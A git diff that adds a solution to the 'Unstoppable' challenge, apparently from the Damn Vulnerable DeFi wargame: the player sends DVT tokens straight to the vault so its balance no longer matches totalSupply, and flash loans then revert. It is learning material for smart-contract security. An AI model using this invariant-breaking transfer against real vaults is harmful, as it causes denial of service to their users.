@@ -45,6 +45,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Causes UnstoppableVault.sol:L96 to revert
+        // by transferring DVT tokens to the vault itself, the underlying asset balance
+        // and the totalSupply are no longer equal. Causing a revert on further flashLoan calls
+        await token.connect(player).transfer(vault.address, 1n ** 18n);
     });
 
     after(async function () {
